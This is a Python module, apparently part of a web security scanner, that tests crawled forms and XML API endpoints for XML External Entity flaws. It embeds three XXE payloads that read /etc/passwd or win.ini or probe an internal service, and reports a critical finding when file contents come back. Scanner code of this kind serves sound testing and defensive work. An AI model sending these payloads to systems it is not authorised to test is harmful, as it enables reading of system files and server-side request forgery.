"""XXE (XML External Entity) Testing"""

from core.models import TestContext, Severity
from .base_security_test import BaseSecurityTest
from loguru import logger


class XXETest(BaseSecurityTest):
    """Test for XXE vulnerabilities"""

    name = "xxe"
    description = "Tests for XML External Entity (XXE) vulnerabilities"
    config_key = "xxe"

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service">]><foo>&xxe;</foo>',
    ]

    async def run_test(self, context: TestContext) -> None:
        """Run XXE tests"""

        for page in context.crawled_pages:
            for form in page.forms:
                # Check if form might accept XML
                if any(inp.get('type') == 'file' or inp.get('name', '').lower() in ['xml', 'data']
                       for inp in form.get('inputs', [])):
                    await self._test_xxe(form, page.url)

        # Test API endpoints that might accept XML
        for endpoint in context.api_endpoints:
            if endpoint.response_type and 'xml' in endpoint.response_type.lower():
                await self._test_api_xxe(endpoint.url, endpoint.method)

    async def _test_xxe(self, form: dict, page_url: str) -> None:
        """Test for XXE vulnerability"""

        url = form.get('action') or page_url
        method = form.get('method', 'POST').upper()

        for payload in self.XXE_PAYLOADS:
            try:
                response = await self.make_request(
                    url,
                    method=method,
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )

                # Check for XXE indicators
                if 'root:' in response.text or '[extensions]' in response.text or 'internal-service' in response.text:
                    self.add_finding(
                        title="XML External Entity (XXE) Vulnerability",
                        description="Application is vulnerable to XXE attack. External entities in XML are processed, "
                                  "allowing attackers to read local files or perform SSRF attacks.",
                        severity=Severity.CRITICAL,
                        url=url,
                        cwe_id="CWE-611",
                        owasp_category="A05:2021-Security Misconfiguration",
                        payload=payload
                    )

            except Exception as e:
                logger.debug(f"Error testing XXE: {str(e)}")

    async def _test_api_xxe(self, url: str, method: str) -> None:
        """Test API endpoint for XXE"""
        await self._test_xxe({'action': url, 'method': method}, url)
